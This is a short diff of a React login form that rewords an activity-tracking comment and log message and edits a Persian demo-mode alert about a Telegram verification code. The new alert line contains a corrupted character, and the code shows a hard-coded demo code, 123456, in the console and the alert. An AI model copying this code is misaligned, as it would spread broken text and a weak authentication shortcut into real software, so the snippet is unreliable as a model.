@@ -113,11 +113,11 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Smart real-time activity tracking based on current step
+  // Simple real-time activity tracking that actually works
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🧠 Starting smart activity tracking for session:",
+        "🚀 Starting SIMPLE real-time tracking for session:",
         sessionId,
       );
 
@@ -295,7 +295,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت و��قعی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
